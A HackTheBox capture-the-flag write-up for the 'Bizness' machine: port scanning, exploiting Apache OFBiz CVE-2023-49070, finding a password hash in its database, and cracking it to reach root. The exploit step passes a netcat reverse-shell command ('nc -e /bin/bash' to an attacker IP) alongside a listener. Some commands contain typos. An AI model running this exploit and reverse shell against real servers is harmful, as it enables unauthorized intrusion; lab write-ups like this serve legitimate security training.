---
title: HTB - Bizness
publishDate: 2024-08-13
description: HTB - Bizness
tags:
  - hackthebox
  - Apache
  - OFBiz
  - dirsearch
  - nmap
  - cracking
  - enumeration
  - hashcat
  - htb-bizness
  - ctf
  - CVE-2023-49070
  - linux
image: bizness-card.png
---

## Box Info

| Name                  | Bizness          | 
| :-------------------- | ---------------: |
| Release Date          | 06 Jan, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Enumeration

```bash
nmap -p- --min-rate 5000 -n -sS -vvv -Pn 10.10.11.252 -oG allports
nmap -sCV -p 22,80,443,40117 10.10.11.252 -oN targeted
```

![Image](bizness1.png)

## Add the domain to /etc/hosts 

```bash
echo "10.10.11.252 bizness.htb | sudo tee -a /etc/hosts/
```
![Image](bizness2.png)

## Brute Force Directory

```bash
dirsearch -u http://bizness.htb/
```
![Image](bizness3.png)

## OFBiz

The website is using a technology called `OFBiz` with version `18.12`, the current version is out date.

![Image](bizness4.png)

## Apache OFBiz 18.12 CVE-2023-49070

![Image](Bizness5.png)

[***Apache-OFBiz-Authentication-Bypass***](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)

We used the exploit to authenticate ourselves.

```bash
python3 exploit.py --url  https://bizness.htb:443 --cmd 'nc -e /bin/bash 10.10.14.16 7777'
```

```bash
nc -lvnp 7777
```

![Image](bizness6.png)

## Enumeration linux

Before launching this search, I found a location where the OFBiz folder was located and performed searches that contain admin.
I searched recursively using grep, using options like -Rail, and to specify the word I used -e.

```shell
grep -Rail -e 'admin$' /top/ofbiz/runtime/data/derby/ofbiz/seg0
```

![Image](bizness7.png)

We came across a lot of data, so we have to go through each one by one.

We find a user and the hash

![Image](bizness8.png)

## Cracking Hash

We will use the Go hash matcher script to crack the password.

[**Go-Hash-Matcher**](https://github.com/IamLucif3r/Go-Hash-Matcher?source=post_page-----68713a41f98b--------------------------------)

![Image](bizness9.png)

Once we have the password, we log in at the `root` 

![Image](bizness10.png)